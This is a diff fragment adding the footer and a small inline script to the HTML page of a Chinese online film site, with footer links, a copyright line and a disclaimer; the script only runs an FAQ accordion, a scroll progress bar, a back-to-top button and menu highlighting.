+        <a href="#about">网站简介</a>
+        <a href="#about">联系我们</a>
+        <a href="#about">合作推广</a>
+        <a href="#about">免责声明</a>
+        <a href="#about">用户协议</a>
+      </div>
+    </div>
+    <div class="copy">
+      <p>© 2026 未来电影网(weilaidianyingwang-wap) 版权所有 · <a href="https://weilaidianyingwang-wap.github.io/">https://weilaidianyingwang-wap.github.io/</a></p>
+      <p style="margin-top:8px">本站仅供影视资讯与在线观看服务，如有侵权请联系我们处理。</p>
+    </div>
+  </div>
+</section>
+
+<button class="top" id="top" onclick="window.scrollTo({top:0,behavior:'smooth'})" aria-label="回到顶部">↑</button>
+
+<script>
+var items=document.querySelectorAll('.fq-item');
+items.forEach(function(it){
+  it.querySelector('.fq-head').addEventListener('click',function(){
+    var open=it.classList.contains('open');
+    items.forEach(function(x){x.classList.remove('open');x.querySelector('.fq-body').style.maxHeight=null});
+    if(!open){it.classList.add('open');it.querySelector('.fq-body').style.maxHeight=it.querySelector('.fq-body').scrollHeight+40+'px'}
+  });
+});
+window.addEventListener('scroll',function(){
+  var st=document.documentElement.scrollTop||document.body.scrollTop;
+  var h=document.documentElement.scrollHeight-document.documentElement.clientHeight;
+  document.getElementById('bar').style.width=(st/h*100)+'%';
+  document.getElementById('top').classList.toggle('show',st>400);
+  var cur='';
+  document.querySelectorAll('section[id]').forEach(function(s){if(s.getBoundingClientRect().top<=140)cur=s.id});
+  document.querySelectorAll('.menu a').forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur)});
+  if(window.innerWidth<=900)document.getElementById('menu').classList.remove('open');
+});
+document.querySelector('.fq-item.open .fq-head').click();
+</script>
+</body>
+</html>
